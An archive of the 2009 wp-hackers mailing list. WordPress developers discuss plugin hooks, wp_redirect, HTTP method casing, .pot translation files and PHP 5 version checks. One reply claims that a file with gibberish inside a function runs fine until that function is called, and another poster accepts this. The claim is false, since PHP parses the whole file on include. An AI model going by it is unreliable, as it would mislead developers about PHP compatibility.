From: m at mullenweg.com (Matt Mullenweg)
Date: Sun, 19 Jul 2009 09:11:56 -0700
Subject: [wp-hackers] row output on wp-admin/users.php
In-Reply-To: <c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com>
References: <F4123DB7-8E29-4FBE-B2D7-8B45D5289E38@sproutventure.com>
	<3CC2974E-7B0A-4C7C-8042-622698BB70F9@striderweb.com>	<68528DBC-5C7A-4E18-B3A9-242A34A49EB7@sproutventure.com>
	<CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
	<c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com>
Message-ID: <4A6345CC.4070006@mullenweg.com>

On 7/16/2009 10:05 AM, Claudio Simeone wrote:
> add_action('manage_users_custom_column', my_user_cols_cc'); // this not

You're missing an opening quote there -- is that in the original code or 
a copy/paste error?

If your action function accepts multiple arguments, you need to tell 
add_action as well:

http://codex.wordpress.org/Function_Reference/add_action

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Sun Jul 19 16:17:54 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sun, 19 Jul 2009 09:17:54 -0700
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
References: <17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <4A634732.4060805@mullenweg.com>

On 7/18/2009 10:29 PM, Mike Schinkel wrote:
> Oops, that one line should have been ($path, not $$path):
>
>    header('Location:' . $url_paths[$path],true,301);

For extra points, use wp_redirect:

http://codex.wordpress.org/Function_Reference/wp_redirect

It works on IIS and Apache, and also with different PHP setups that a 
regular header() call won't.

It's also more secure, the URLs are sanitized and run through KSES to 
disallow header splitting attacks.

See also:

http://codex.wordpress.org/Data_Validation#HTTP_Headers

http://en.wikipedia.org/wiki/HTTP_response_splitting

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Sun Jul 19 16:21:54 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sun, 19 Jul 2009 09:21:54 -0700
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>	<4A5E2967.50503@mullenweg.com>	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
	<67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
Message-ID: <4A634822.7070504@mullenweg.com>

On 7/16/2009 11:15 PM, Peter Westwood wrote:
> A I said earlier in the thread the HTTP method argument is
> case-sensitive so we should not strtoupper every method.

Are there any methods that are not all uppercase? I can't find any. 
That's why I thought it might make sense to auto-uppercase.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From heiko.rabe at code-styling.de  Sun Jul 19 16:46:50 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Sun, 19 Jul 2009 18:46:50 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins gets
 broken by PoEdit
In-Reply-To: <9DAEA0C1-71C8-4C62-81F9-933AAD713E7F@striderweb.com>
References: <4A63258F.2020300@code-styling.de>
	<9DAEA0C1-71C8-4C62-81F9-933AAD713E7F@striderweb.com>
Message-ID: <4A634DFA.1030400@code-styling.de>

Yes this only works for active plugins (as i wrote) and yes it forces 
double definition (plugin comment header AND gettext).
The point is, that without a gettext based definition the plugin fields 
definitely get lost by a new gettext scanning process of source files.

This gettext calls could also place in a NOP function, never called 
elsewhere but ensure keeping it inside *.po file during rescan but yes 
this forces at least double definition.

regards


> Am I correct in thinking this would only work if the plugin is 
> active?  This info needs to work for inactive plugins too.  Also it 
> seems to require double-entry of data, which to me is a bad idea.
>
> Stephen
>
> On Jul 19, 2009, at 8:54 AM, Heiko Rabe wrote:
>
>> ...
>
>> This dissenting message entry creation is not standardized and won't 
>> work with normal gettext pasing applications.
>> There should be introduced a safe way this can also be handled by 
>> re-scanning with gettext applications, otherwise this feature is 
>> worthless.
>> One option would be a section of code only for purpose of getting 
>> this right by gettext processors like:
>>
>> function my_plugin_data($plugin_data) {
>>   $plugin['Name'] => __('....', 'custom-field-images'),
>>   $plugin['Title'] => __('....', 'custom-field-images'),
>>   $plugin['PluginURI'] => __('....', 'custom-field-images'),
>>   $plugin['Description'] =>__('....', 'custom-field-images'),
>>   $plugin['Author'] => __('....', 'custom-field-images'),
>>   $plugin['AuthorURI'] => __('....', 'custom-field-images'),
>>   $plugin['Version'] => __('....', 'custom-field-images'),
>>   $plugin['TextDomain'] => __('....', 'custom-field-images') ,
>>   $plugin['DomainPath'] => __('....', 'custom-field-images')
>>   return $plugin_data;
>> }
>> add_filter('wp_plugin_data-' .'custom-field-images', 'my_plugin_data');
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


From mikeschinkel at newclarity.net  Sun Jul 19 17:44:46 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 19 Jul 2009 13:44:46 -0400
Subject: [wp-hackers] mod_rewrite help
In-Reply-To: <4A634732.4060805@mullenweg.com>
References: <17016724.3741247981350654.JavaMail.DELL-1405$@Dell-1405>
	<4A634732.4060805@mullenweg.com>
Message-ID: <DA058014-E9CE-47A1-B3EE-4AB47CAA0BD0@newclarity.net>

Matt:

Very nice! Thanks for educating me and others on this best practice.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




On Jul 19, 2009, at 12:17 PM, Matt Mullenweg wrote:

> On 7/18/2009 10:29 PM, Mike Schinkel wrote:
>> Oops, that one line should have been ($path, not $$path):
>>
>>   header('Location:' . $url_paths[$path],true,301);
>
> For extra points, use wp_redirect:
>
> http://codex.wordpress.org/Function_Reference/wp_redirect
>
> It works on IIS and Apache, and also with different PHP setups that  
> a regular header() call won't.
>
> It's also more secure, the URLs are sanitized and run through KSES  
> to disallow header splitting attacks.
>
> See also:
>
> http://codex.wordpress.org/Data_Validation#HTTP_Headers
>
> http://en.wikipedia.org/wiki/HTTP_response_splitting
>
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at santosj.name  Sun Jul 19 18:25:52 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Sun, 19 Jul 2009 13:25:52 -0500
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <4A634822.7070504@mullenweg.com>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
	<67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
	<4A634822.7070504@mullenweg.com>
Message-ID: <20090719132552.e75a0329.wordpress@santosj.name>

No, there aren't any methods that currently exist that are mixed case or lower case. All existing methods are uppercase. That is not to say that there couldn't be or won't be in the future. It is also to say that most of the time, we should be doing POST, GET, or HEAD. All of the others such as PUT, have no guarantee to be supported on the server we are requesting, and most likely would be blocked from doing a PUT request.

Furthermore, if someone is using a non-standard method, they either know what they are doing, or should not be doing it. Alas, such things should probably be in a header than a method as the server probably won't know what to do with it otherwise. There is a reason DAV requires an extension, is that it is an extension to the HTTP 1.1 standard and not part of it.

So in conclusion, if someone is doing something other than POST, GET, HEAD, or one of the HTTP 1.1, then they are doing it wrong and therefore we can safely uppercase the method.

-- 
Jacob Santos



On Sun, 19 Jul 2009 09:21:54 -0700
Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/16/2009 11:15 PM, Peter Westwood wrote:
> > A I said earlier in the thread the HTTP method argument is
> > case-sensitive so we should not strtoupper every method.
> 
> Are there any methods that are not all uppercase? I can't find any. 
> That's why I thought it might make sense to auto-uppercase.
> 
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers




From heiko.rabe at code-styling.de  Sun Jul 19 19:13:03 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Sun, 19 Jul 2009 21:13:03 +0200
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <20090719132552.e75a0329.wordpress@santosj.name>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>	<4A5E2967.50503@mullenweg.com>	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>	<67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>	<4A634822.7070504@mullenweg.com>
	<20090719132552.e75a0329.wordpress@santosj.name>
Message-ID: <4A63703F.7010201@code-styling.de>

I think, that excluding PUT would not a good idea, because the cloud 
computing from Microsoft's Azure Platform 
http://www.microsoft.com/azure/default.mspx needs as example for azure 
blobs a PUT.
Most of this services can be used RESTful and HTTP/HTTPS based, so this 
may also be a future option to integrate useful services into WP out of 
the clouds.

regards

> No, there aren't any methods that currently exist that are mixed case or lower case. All existing methods are uppercase. That is not to say that there couldn't be or won't be in the future. It is also to say that most of the time, we should be doing POST, GET, or HEAD. All of the others such as PUT, have no guarantee to be supported on the server we are requesting, and most likely would be blocked from doing a PUT request.
>
> Furthermore, if someone is using a non-standard method, they either know what they are doing, or should not be doing it. Alas, such things should probably be in a header than a method as the server probably won't know what to do with it otherwise. There is a reason DAV requires an extension, is that it is an extension to the HTTP 1.1 standard and not part of it.
>
> So in conclusion, if someone is doing something other than POST, GET, HEAD, or one of the HTTP 1.1, then they are doing it wrong and therefore we can safely uppercase the method.
>
>   


From mikeschinkel at newclarity.net  Sun Jul 19 19:21:55 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 19 Jul 2009 14:21:55 -0500 (CDT)
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <6418120.3851248031263609.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <16433747.3871248031310192.JavaMail.DELL-1405$@Dell-1405>

"Heiko Rabe" <heiko.rabe at code-styling.de> wrote:
> excluding PUT would not a good idea

+100

DELETE is also needed. Without it you can't create a RESTful web service [1][2][3].

"Jacob Santos" <wordpress at santosj.name> wrote:
> or one of the HTTP 1.1,

Or did we misunderstand?  By saying HTTP 1.1 were you implying PUT and DELETE?  If so, forgive the intrusion.

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

[1] http://www.artima.com/lejava/articles/why_put_and_delete.html
[2] http://www.xml.com/pub/a/2004/12/01/restful-web.html
[3] http://en.wikipedia.org/wiki/Representational_State_Transfer#RESTful_example:_the_World_Wide_Web


----- Original Message -----
From: "Heiko Rabe" <heiko.rabe at code-styling.de>
To: wp-hackers at lists.automattic.com
Sent: Sunday, July 19, 2009 3:13:03 PM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] HTTP Request API edge case

I think, that excluding PUT would not a good idea, because the cloud 
computing from Microsoft's Azure Platform 
http://www.microsoft.com/azure/default.mspx needs as example for azure 
blobs a PUT.
Most of this services can be used RESTful and HTTP/HTTPS based, so this 
may also be a future option to integrate useful services into WP out of 
the clouds.

regards

> No, there aren't any methods that currently exist that are mixed case or lower case. All existing methods are uppercase. That is not to say that there couldn't be or won't be in the future. It is also to say that most of the time, we should be doing POST, GET, or HEAD. All of the others such as PUT, have no guarantee to be supported on the server we are requesting, and most likely would be blocked from doing a PUT request.
>
> Furthermore, if someone is using a non-standard method, they either know what they are doing, or should not be doing it. Alas, such things should probably be in a header than a method as the server probably won't know what to do with it otherwise. There is a reason DAV requires an extension, is that it is an extension to the HTTP 1.1 standard and not part of it.
>
> So in conclusion, if someone is doing something other than POST, GET, HEAD, or one of the HTTP 1.1, then they are doing it wrong and therefore we can safely uppercase the method.
>
>   

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From wordpress at santosj.name  Sun Jul 19 22:45:47 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Sun, 19 Jul 2009 17:45:47 -0500
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <16433747.3871248031310192.JavaMail.DELL-1405$@Dell-1405>
References: <6418120.3851248031263609.JavaMail.DELL-1405$@Dell-1405>
	<16433747.3871248031310192.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <20090719174547.4e34264c.wordpress@santosj.name>

You are forgiven for the misunderstanding as I might not have been clear enough. The point I was trying to make was that all existing HTTP methods are uppercase, or at least those that servers understand or can be made to understand (like WebDAV and mod_dav_svn).

Alas, I said nothing of exclusion other than server support, which the HTTP API has no control over. The HTTP API must never exclude you from using a method, even if the method you are using is incorrect or not supported. The most that would happen is that the server will kick it back or not do anything.

I attempting to stay out of the discussion as to whether we should help people are send the incorrect method. If they use the *_post(), *_get(), or *_head(), then the method will always be set correctly. If you are using another method, then it is up to you to do so correctly, else you shouldn't be using it at all.

Jacob Santos


On Sun, 19 Jul 2009 14:21:55 -0500 (CDT)
Mike Schinkel <mikeschinkel at newclarity.net> wrote:

> "Heiko Rabe" <heiko.rabe at code-styling.de> wrote:
> > excluding PUT would not a good idea
> 
> +100
> 
> DELETE is also needed. Without it you can't create a RESTful web service [1][2][3].
> 
> "Jacob Santos" <wordpress at santosj.name> wrote:
> > or one of the HTTP 1.1,
> 
> Or did we misunderstand?  By saying HTTP 1.1 were you implying PUT and DELETE?  If so, forgive the intrusion.
> 
> -Mike Schinkel
> Custom Wordpress Plugins
> http://mikeschinkel.com/custom-wordpress-plugins
> 
> [1] http://www.artima.com/lejava/articles/why_put_and_delete.html
> [2] http://www.xml.com/pub/a/2004/12/01/restful-web.html
> [3] http://en.wikipedia.org/wiki/Representational_State_Transfer#RESTful_example:_the_World_Wide_Web
> 
> 
> ----- Original Message -----
> From: "Heiko Rabe" <heiko.rabe at code-styling.de>
> To: wp-hackers at lists.automattic.com
> Sent: Sunday, July 19, 2009 3:13:03 PM GMT -05:00 US/Canada Eastern
> Subject: Re: [wp-hackers] HTTP Request API edge case
> 
> I think, that excluding PUT would not a good idea, because the cloud 
> computing from Microsoft's Azure Platform 
> http://www.microsoft.com/azure/default.mspx needs as example for azure 
> blobs a PUT.
> Most of this services can be used RESTful and HTTP/HTTPS based, so this 
> may also be a future option to integrate useful services into WP out of 
> the clouds.
> 
> regards
> 
> > No, there aren't any methods that currently exist that are mixed case or lower case. All existing methods are uppercase. That is not to say that there couldn't be or won't be in the future. It is also to say that most of the time, we should be doing POST, GET, or HEAD. All of the others such as PUT, have no guarantee to be supported on the server we are requesting, and most likely would be blocked from doing a PUT request.
> >
> > Furthermore, if someone is using a non-standard method, they either know what they are doing, or should not be doing it. Alas, such things should probably be in a header than a method as the server probably won't know what to do with it otherwise. There is a reason DAV requires an extension, is that it is an extension to the HTTP 1.1 standard and not part of it.
> >
> > So in conclusion, if someone is doing something other than POST, GET, HEAD, or one of the HTTP 1.1, then they are doing it wrong and therefore we can safely uppercase the method.
> >
> >   
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


-- 
Jacob Santos <wordpress at santosj.name>


From simon at sweetinteraction.com  Mon Jul 20 06:03:26 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Mon, 20 Jul 2009 07:03:26 +0100
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <20090719174547.4e34264c.wordpress@santosj.name>
References: <6418120.3851248031263609.JavaMail.DELL-1405$@Dell-1405>
	<16433747.3871248031310192.JavaMail.DELL-1405$@Dell-1405>
	<20090719174547.4e34264c.wordpress@santosj.name>
Message-ID: <77c8b7bf0907192303g231ef4bet8f87252291b2787c@mail.gmail.com>

2009/7/19 Jacob Santos <wordpress at santosj.name>:
>
> I attempting to stay out of the discussion as to whether we should help people are send the incorrect method. If they use the *_post(), *_get(), or *_head(), then the method will always be set correctly. If you are using another method, then it is up to you to do so correctly, else you shouldn't be using it at all.
>

Thanks for the tip, I hadn't spotted those methods somehow.

S


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From jeremy at visser.name  Mon Jul 20 06:40:43 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Mon, 20 Jul 2009 16:40:43 +1000
Subject: [wp-hackers] HTTP Request API edge case
In-Reply-To: <4A63703F.7010201@code-styling.de>
References: <1fa535a70907151201x6cb4688cl22c3d8eccdd64476@mail.gmail.com>
	<4A5E2967.50503@mullenweg.com>
	<b663c87ccd46d2a955c55fa8199016cf.squirrel@secure.ftwr.co.uk>
	<77c8b7bf0907160146x687b9f6bu3c30819c422bce62@mail.gmail.com>
	<3afefe4f003450cf9e66ecae4ec3d381.squirrel@secure.ftwr.co.uk>
	<1fa535a70907160642p426eeda0h4540546075f246f6@mail.gmail.com>
	<1247789214.4563.5.camel@rillian.narnia.sunriseroad.net>
	<67B84451-B77E-4569-AFA6-8D5A6E91D9E3@ftwr.co.uk>
	<4A634822.7070504@mullenweg.com>
	<20090719132552.e75a0329.wordpress@santosj.name>
	<4A63703F.7010201@code-styling.de>
Message-ID: <1248072043.4530.2.camel@rillian.narnia.sunriseroad.net>

On Sun, 2009-07-19 at 21:13 +0200, Heiko Rabe wrote:
> I think, that excluding PUT would not a good idea, because the cloud 
> computing from Microsoft's Azure Platform needs as example for azure 
> blobs a PUT.

As does Amazon S3, IIRC. If somebody wanted to write a plugin to, say,
store image uploads on S3, then they would be constricted by excluding
PUT.


From scribu at gmail.com  Mon Jul 20 10:24:04 2009
From: scribu at gmail.com (scribu)
Date: Mon, 20 Jul 2009 13:24:04 +0300
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins gets
	broken by PoEdit
In-Reply-To: <4A634DFA.1030400@code-styling.de>
References: <4A63258F.2020300@code-styling.de>
	<9DAEA0C1-71C8-4C62-81F9-933AAD713E7F@striderweb.com>
	<4A634DFA.1030400@code-styling.de>
Message-ID: <349fe48b0907200324h26eb6aa0i8ce6c54766bded80@mail.gmail.com>

This is the reason that plugin authors provide a .pot file generated with
the custom WP scanner. It's not a perfect solution, but it's a good
compromise, imo.


On Sun, Jul 19, 2009 at 7:46 PM, Heiko Rabe <heiko.rabe at code-styling.de>wrote:

> Yes this only works for active plugins (as i wrote) and yes it forces
> double definition (plugin comment header AND gettext).
> The point is, that without a gettext based definition the plugin fields
> definitely get lost by a new gettext scanning process of source files.
>
> This gettext calls could also place in a NOP function, never called
> elsewhere but ensure keeping it inside *.po file during rescan but yes this
> forces at least double definition.
>
> regards
>
>
>
>  Am I correct in thinking this would only work if the plugin is active?
>>  This info needs to work for inactive plugins too.  Also it seems to require
>> double-entry of data, which to me is a bad idea.
>>
>> Stephen
>>
>> On Jul 19, 2009, at 8:54 AM, Heiko Rabe wrote:
>>
>>  ...
>>>
>>
>>  This dissenting message entry creation is not standardized and won't work
>>> with normal gettext pasing applications.
>>> There should be introduced a safe way this can also be handled by
>>> re-scanning with gettext applications, otherwise this feature is worthless.
>>> One option would be a section of code only for purpose of getting this
>>> right by gettext processors like:
>>>
>>> function my_plugin_data($plugin_data) {
>>>  $plugin['Name'] => __('....', 'custom-field-images'),
>>>  $plugin['Title'] => __('....', 'custom-field-images'),
>>>  $plugin['PluginURI'] => __('....', 'custom-field-images'),
>>>  $plugin['Description'] =>__('....', 'custom-field-images'),
>>>  $plugin['Author'] => __('....', 'custom-field-images'),
>>>  $plugin['AuthorURI'] => __('....', 'custom-field-images'),
>>>  $plugin['Version'] => __('....', 'custom-field-images'),
>>>  $plugin['TextDomain'] => __('....', 'custom-field-images') ,
>>>  $plugin['DomainPath'] => __('....', 'custom-field-images')
>>>  return $plugin_data;
>>> }
>>> add_filter('wp_plugin_data-' .'custom-field-images', 'my_plugin_data');
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From heiko.rabe at code-styling.de  Mon Jul 20 11:34:08 2009
From: heiko.rabe at code-styling.de (heiko.rabe at code-styling.de)
Date: Mon, 20 Jul 2009 13:34:08 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins
 getsbroken by PoEdit
Message-ID: <6172556.2782521248089649001.JavaMail.servlet@kundenserver>

In my opinion this is not a compromise, because i didn't want first to commit my plugin, afterwards create to *.pot and than build my german translation and have to repeat again a commit.
This is annoying work.
It must be scannable by gettext processors anyway without loosing informations, imo.

>This is the reason that plugin authors provide a .pot file generated with 
>the custom WP scanner. It's not a perfect solution, but it's a good
>compromise, imo.

From scribu at gmail.com  Mon Jul 20 12:46:55 2009
From: scribu at gmail.com (scribu)
Date: Mon, 20 Jul 2009 15:46:55 +0300
Subject: [wp-hackers] wordpress.org *.pot file feature for plugins
	getsbroken by PoEdit
In-Reply-To: <6172556.2782521248089649001.JavaMail.servlet@kundenserver>
References: <6172556.2782521248089649001.JavaMail.servlet@kundenserver>
Message-ID: <349fe48b0907200546na2d03dr8c135e35b2588d64@mail.gmail.com>

You can download (via svn) the scanner from here (I'm sure it has an intro
page somewhere):

http://svn.automattic.com/wordpress-i18n/tools/trunk

and use it before commiting a plugin.


On Mon, Jul 20, 2009 at 2:34 PM, <heiko.rabe at code-styling.de> wrote:

> In my opinion this is not a compromise, because i didn't want first to
> commit my plugin, afterwards create to *.pot and than build my german
> translation and have to repeat again a commit.
> This is annoying work.
> It must be scannable by gettext processors anyway without loosing
> informations, imo.
>
> >This is the reason that plugin authors provide a .pot file generated with
> >the custom WP scanner. It's not a perfect solution, but it's a good
> >compromise, imo.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From heiko.rabe at code-styling.de  Mon Jul 20 13:14:18 2009
From: heiko.rabe at code-styling.de (heiko.rabe at code-styling.de)
Date: Mon, 20 Jul 2009 15:14:18 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature for
 pluginsgetsbroken by PoEdit
Message-ID: <29107846.2446491248095658555.JavaMail.servlet@kundenserver>

I know this. But the point is, that a lot of translation frameworks only based on normal gettext capabilities and also assume, that a rescan process can run every time on demand if required.
Out of this scope this breaks all arround based on normal gettext behavoir.
Any msgid not having a line number/file reference and can't be found by the gettext function definitions will be declared as obsolete. 

I know, that this has been born out of the need, that inactive plugins should be translatable too. But the way they the translated is also not best case. In a loop the language files will be load (and will reside in memory after translation the fields nevertheless). As you may know a 300kb WordPress main file will consume on servers upto 4MB! PHP memory, the leads to a mutiplier of 10 - 12!

Now lets say, you are having 70 plugins and 20 are currently active. Lets also say, that they have an average of 30kb language file.

= 30kb * multiplier * 70 = 24.6 MB 

wasted by processing this translations this way.
How you explain to users/customers, that they exceed there PHP memory limit every time they try to load the plugin overview page ?

This are only a subset of issues. I never want to trash this feature but a more sophisticated solution is required than this one or you have a lot of trouble in consulting/helpdesk to explain that this is a big design issue of WordPress itself!


>You can download (via svn) the scanner from here (I'm sure it has an intro
>page somewhere):

>http://svn.automattic.com/wordpress-i18n/tools/trunk

>and use it before commiting a plugin.


>> In my opinion this is not a compromise, because i didn't want first to
>> commit my plugin, afterwards create to *.pot and than build my german
>> translation and have to repeat again a commit.
>> This is annoying work.
>> It must be scannable by gettext processors anyway without loosing
>> informations, imo.
>>
>>>This is the reason that plugin authors provide a .pot file generated with
>>>the custom WP scanner. It's not a perfect solution, but it's a good
>>>compromise, imo.

From otto at ottodestruct.com  Mon Jul 20 13:20:47 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 20 Jul 2009 08:20:47 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <4A613742.2040206@xavisys.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com> 
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com> 
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
Message-ID: <161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>

You don't even need to do that. As long as the PHP 5 code doesn't get
executed on the initial include, then it works fine.

It's like this:
/**
 * plugin_activation_check()
 *
 * Replace "plugin" with the name of your plugin
 */
function plugin_activation_check(){
       if (version_compare(PHP_VERSION, '5.0.0', '<')) {
               deactivate_plugins(basename(__FILE__)); // Deactivate ourself
               wp_die("Sorry, but you can't run this plugin, it
requires PHP 5 or higher.");
       }
}
register_activation_hook(__FILE__, 'plugin_activation_check');

function do_plugin_actual_work() {
// a bunch of php 5 only code here
}


That will run fine. PHP only will throw an error if it actually makes
it to the code. Code is interpreted at the time of execution, not at
the time of inclusion. You can include a file with complete gibberish
inside a function, but until you try to use that function, it won't
stop the program.

-Otto



On Fri, Jul 17, 2009 at 9:45 PM, Aaron D. Campbell<aaron at xavisys.com> wrote:
> No offense to the PHP 4 users out there, but it's not worth the hassle.
>
> Chris Jean wrote:
>>
>> In other words, you could create a small base plugin file that contained
>> the plugin meta-data to register the plugin and contained nothing more than
>> the version check as Otto described. If the version check passes, load the
>> necessary code from another file included with the plugin.
>>
>> Chris Jean
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From J_COCKIN at uncg.edu  Mon Jul 20 14:01:35 2009
From: J_COCKIN at uncg.edu (John Cocking J_COCKIN)
Date: Mon, 20 Jul 2009 10:01:35 -0400
Subject: [wp-hackers] John Cocking is out of the office.
Message-ID: <OF26B5C598.0DBF6EBC-ON852575F9.004D0CB2-852575F9.004D0CB2@email.uncg.edu>


I will be out of the office starting Mon 07/20/2009 and will not return
until Thu 08/13/2009.

I will respond to your message when I return. If you require immediate
assistance, call 6-TECH or email 6-tech at uncg.edu.


From gaarai at gaarai.com  Mon Jul 20 15:20:09 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 20 Jul 2009 10:20:09 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
Message-ID: <4A648B29.1070408@gaarai.com>

That's a good tip Otto. I didn't know that. Thanks. :)

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Otto wrote:
> You don't even need to do that. As long as the PHP 5 code doesn't get
> executed on the initial include, then it works fine.
>
> It's like this:
> /**
>  * plugin_activation_check()
>  *
>  * Replace "plugin" with the name of your plugin
>  */
> function plugin_activation_check(){
>        if (version_compare(PHP_VERSION, '5.0.0', '<')) {
>                deactivate_plugins(basename(__FILE__)); // Deactivate ourself
>                wp_die("Sorry, but you can't run this plugin, it
> requires PHP 5 or higher.");
>        }
> }
> register_activation_hook(__FILE__, 'plugin_activation_check');
>
> function do_plugin_actual_work() {
> // a bunch of php 5 only code here
> }
>
>
> That will run fine. PHP only will throw an error if it actually makes
> it to the code. Code is interpreted at the time of execution, not at
> the time of inclusion. You can include a file with complete gibberish
> inside a function, but until you try to use that function, it won't
> stop the program.
>
> -Otto
>
>
>
> On Fri, Jul 17, 2009 at 9:45 PM, Aaron D. Campbell<aaron at xavisys.com> wrote:
>   
>> No offense to the PHP 4 users out there, but it's not worth the hassle.
>>
>> Chris Jean wrote:
>>     
>>> In other words, you could create a small base plugin file that contained
>>> the plugin meta-data to register the plugin and contained nothing more than
>>> the version check as Otto described. If the version check passes, load the
>>> necessary code from another file included with the plugin.
>>>
>>> Chris Jean
>>>       
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
